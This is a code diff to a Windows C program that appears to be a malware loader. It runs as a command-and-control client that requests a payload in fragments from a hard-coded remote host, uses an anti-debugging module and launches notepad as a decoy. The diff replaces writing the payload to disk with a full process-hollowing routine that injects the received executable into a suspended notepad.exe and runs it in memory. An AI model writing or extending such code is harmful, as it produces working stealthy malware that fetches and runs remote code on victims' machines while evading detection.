@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <ws2tcpip.h>
+#include <winternl.h>
 #include "antidebug.h"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -13,7 +14,11 @@
 #define PORT 8080
 #define DEVICE_B_IP "192.168.116.129"
 
-// Your get_local_ip function
+// Process Hollowing function prototypes
+typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+// Your get_local_ip function remains the same
 char* get_local_ip() {
     static char ip[INET_ADDRSTRLEN];
     
@@ -46,9 +51,169 @@ char* get_local_ip() {
     return "127.0.0.1";
 }
 
-// Function that runs the C2 client code - EXACT copy of test.c main()
+// Process Hollowing implementation - integrated from process_hollowing.c
+BOOL ProcessHollowing(const char* targetPath, unsigned char* payload, size_t payloadSize) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CONTEXT ctx;
+    SIZE_T bytesRead, bytesWritten;
+    
+    // Parse payload PE headers
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dosHeader->e_lfanew);
+    
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        printf("[ERROR] Invalid PE file format\n");
+        return FALSE;
+    }
+    
+    printf("[INFO] Entry Point: 0x%X\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);
+    printf("[INFO] Image Base: 0x%p\n", (PVOID)ntHeaders->OptionalHeader.ImageBase);
+    
+    // Step 1: Create target process in suspended state
+    printf("[STEP 1] Creating suspended process: %s\n", targetPath);
+    
+    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
+                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[ERROR] Failed to create process. Error: %d\n", GetLastError());
+        return FALSE;
+    }
+    
+    printf("[SUCCESS] Process created with PID: %d (SUSPENDED)\n", pi.dwProcessId);
+    
+    // Step 2: Get thread context
+    printf("[STEP 2] Getting thread context...\n");
+    ctx.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(pi.hThread, &ctx)) {
+        printf("[ERROR] Failed to get thread context\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    // Read PEB to get image base address
+    PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)ctx.Rdx + 0x10);
+    PVOID imageBase;
+    
+    if (!ReadProcessMemory(pi.hProcess, pebImageBaseOffset, 
+                          &imageBase, sizeof(PVOID), &bytesRead)) {
+        printf("[ERROR] Failed to read image base address\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    printf("[INFO] Original image base: 0x%p\n", imageBase);
+    
+    // Step 3: Unmap original executable
+    printf("[STEP 3] Unmapping original executable...\n");
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    pNtUnmapViewOfSection NtUnmapViewOfSection = 
+        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
+    
+    if (NtUnmapViewOfSection) {
+        NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
+        if (status == 0) {
+            printf("[SUCCESS] Original image unmapped\n");
+        }
+    }
+    
+    // Step 4: Allocate memory for payload
+    printf("[STEP 4] Allocating memory in target process...\n");
+    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, 
+                                         (PVOID)ntHeaders->OptionalHeader.ImageBase,
+                                         ntHeaders->OptionalHeader.SizeOfImage,
+                                         MEM_COMMIT | MEM_RESERVE,
+                                         PAGE_EXECUTE_READWRITE);
+    
+    if (!newImageBase) {
+        newImageBase = VirtualAllocEx(pi.hProcess, NULL,
+                                     ntHeaders->OptionalHeader.SizeOfImage,
+                                     MEM_COMMIT | MEM_RESERVE,
+                                     PAGE_EXECUTE_READWRITE);
+    }
+    
+    if (!newImageBase) {
+        printf("[ERROR] Failed to allocate memory\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    printf("[SUCCESS] Memory allocated at: 0x%p\n", newImageBase);
+    
+    // Step 5: Write PE headers
+    printf("[STEP 5] Writing PE headers...\n");
+    if (!WriteProcessMemory(pi.hProcess, newImageBase, payload,
+                           ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
+        printf("[ERROR] Failed to write headers\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    // Step 6: Write PE sections
+    printf("[STEP 6] Writing PE sections...\n");
+    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+    
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        if (sectionHeader[i].SizeOfRawData > 0) {
+            LPVOID sectionDestination = (LPVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
+            LPVOID sectionSource = (LPVOID)((ULONG_PTR)payload + sectionHeader[i].PointerToRawData);
+            
+            if (!WriteProcessMemory(pi.hProcess, sectionDestination, sectionSource,
+                                   sectionHeader[i].SizeOfRawData, &bytesWritten)) {
+                printf("[ERROR] Failed to write section %s\n", sectionHeader[i].Name);
+                TerminateProcess(pi.hProcess, 0);
+                return FALSE;
+            }
+        }
+    }
+    
+    printf("[SUCCESS] All sections written\n");
+    
+    // Step 7: Update entry point and PEB
+    printf("[STEP 7] Updating thread context...\n");
+    
+    ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    ctx.Rcx = entryPoint;
+    
+    if (!WriteProcessMemory(pi.hProcess, pebImageBaseOffset, &newImageBase,
+                           sizeof(PVOID), &bytesWritten)) {
+        printf("[ERROR] Failed to update PEB\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    if (!SetThreadContext(pi.hThread, &ctx)) {
+        printf("[ERROR] Failed to set thread context\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    // Step 8: Resume thread
+    printf("[STEP 8] Resuming thread...\n");
+    
+    if (ResumeThread(pi.hThread) == -1) {
+        printf("[ERROR] Failed to resume thread\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    printf("[SUCCESS] Process hollowing complete - Payload executing!\n");
+    
+    // Wait for completion
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    
+    DWORD exitCode;
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+    printf("[INFO] Payload exited with code: %d\n", exitCode);
+    
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    
+    return TRUE;
+}
+
+// Modified C2 client function with process hollowing
 void run_c2_client() {
-    InitAntiDebug(); // init antidebugging module
+    InitAntiDebug();
     
     SOCKET sock, server_sock, client_sock;
     struct sockaddr_in server_addr, client_addr, listen_addr;
@@ -67,16 +232,14 @@ void run_c2_client() {
         return;
     }
     
-    // Get the local IP address
     local_ip = get_local_ip();
     if (!local_ip) {
         fprintf(stderr, "Failed to get local IP address\n");
         WSACleanup();
         return;
     }
-    //printf("Device A IP: %s\n", local_ip);
     
-    //printf("Using Device B IP address: %s\n", DEVICE_B_IP);
+    printf("Using Device B IP address: %s\n", DEVICE_B_IP);
     
     // Create socket for sending request
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
@@ -104,12 +267,10 @@ void run_c2_client() {
         return;
     }
     
-    // Send request with our IP
     snprintf(request, BUFFER_SIZE, "REQUEST_PAYLOAD %s", local_ip);
     send(sock, request, (int)strlen(request), 0);
     printf("Request sent to Device B (%s)\n", DEVICE_B_IP);
     
-    // Close initial socket
     closesocket(sock);
     
     // Create socket for receiving fragments
@@ -148,7 +309,6 @@ void run_c2_client() {
     
     printf("Listening for fragments on port %d...\n", PORT + 1);
     
-    // Accept connection from Device B
     if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len)) == INVALID_SOCKET) {
         fprintf(stderr, "Accept failed: %d\n", WSAGetLastError());
         closesocket(server_sock);
@@ -193,7 +353,7 @@ void run_c2_client() {
     }
     
     // Combine fragments
-    char *complete_payload = (char*)malloc(total_size + 1);
+    unsigned char *complete_payload = (unsigned char*)malloc(total_size);
     if (!complete_payload) {
         fprintf(stderr, "Memory allocation for complete payload failed\n");
     } else {
@@ -202,57 +362,19 @@ void run_c2_client() {
             memcpy(complete_payload + offset, fragments[i], fragment_sizes[i]);
             offset += fragment_sizes[i];
         }
-        complete_payload[total_size] = '\0';
         
         printf("Complete payload received: %d bytes total\n", total_size);
-        printf("Payload preview: %.100s%s\n", complete_payload, 
-               (total_size > 100) ? "..." : "");
         
-        // Write and execute the payload
-        FILE *exe_file = fopen("received.exe", "wb");
-        if (exe_file) {
-            fwrite(complete_payload, 1, total_size, exe_file);
-            fclose(exe_file);
-            printf("Executable written to received.exe\n");
-            
-            printf("Executing payload...\n");
-            STARTUPINFO si = {sizeof(si)};
-            PROCESS_INFORMATION pi;
-            si.dwFlags = STARTF_USESHOWWINDOW;
-            si.wShowWindow = SW_SHOW;
-            
-            CreateProcess(
-                "received.exe",
-                NULL, NULL, NULL, FALSE,
-                0, NULL, NULL, &si, &pi
-            );
-
-            if (pi.hProcess) {
-                printf("Waiting for process to complete...\n");
-                
-                // Wait for the process to finish (INFINITE means wait forever)
-                WaitForSingleObject(pi.hProcess, INFINITE);
-                
-                printf("Process completed\n");
-                
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                
-                // Small delay to ensure file handle is fully released
-                Sleep(3000);
-                
-                // Now delete the executable
-                if (remove("received.exe") == 0) {
-                    printf("Executable deleted successfully\n");
-                } else {
-                    fprintf(stderr, "Failed to delete executable\n");
-                }
-            } else {
-                fprintf(stderr, "Failed to create process\n");
-            }
+        // Use Process Hollowing instead of direct execution
+        printf("\n=== INITIATING PROCESS HOLLOWING ===\n");
+        const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";
+        
+        if (ProcessHollowing(targetProcess, complete_payload, total_size)) {
+            printf("Process hollowing completed successfully\n");
         } else {
-            fprintf(stderr, "Failed to write executable file\n");
+            printf("Process hollowing failed\n");
         }
+        
         free(complete_payload);
     }
     
@@ -268,12 +390,10 @@ void run_c2_client() {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Check if we're running as the C2 client subprocess
     if (lpCmdLine && strstr(lpCmdLine, "c2mode") != NULL) {
-        // Allocate a console to see printf output
         AllocConsole();
         freopen("CONOUT$", "w", stdout);
         freopen("CONOUT$", "w", stderr);
         
-        // We are in C2 mode - run the C2 client
         run_c2_client();
         
         printf("Press Enter to exit...\n");
@@ -281,14 +401,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
     
-    // Main launcher mode - spawn both processes
-    
-    // 1. Start ourselves again in C2 mode (detached background process)
+    // Main launcher mode
     STARTUPINFO si_c2 = {sizeof(si_c2)};
     PROCESS_INFORMATION pi_c2;
-    // Show the console window to see debug output
     si_c2.dwFlags = STARTF_USESHOWWINDOW;
-    si_c2.wShowWindow = SW_SHOW;  // Change to SW_SHOW to see it working
+    si_c2.wShowWindow = SW_SHOW;
     
     char exePath[MAX_PATH];
     GetModuleFileName(NULL, exePath, MAX_PATH);
@@ -297,18 +414,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     snprintf(cmdLine, sizeof(cmdLine), "\"%s\" c2mode", exePath);
     
     if (CreateProcess(
-        NULL,
-        cmdLine,
+        NULL, cmdLine,
         NULL, NULL, FALSE,
-        0,  // Remove CREATE_NO_WINDOW to see console
-        NULL, NULL,
+        0, NULL, NULL,
         &si_c2, &pi_c2
     )) {
         CloseHandle(pi_c2.hProcess);
         CloseHandle(pi_c2.hThread);
     }
     
-    // 2. Launch notepad immediately
+    // Launch notepad as decoy
     STARTUPINFO si = {sizeof(si)};
     PROCESS_INFORMATION pi;
     
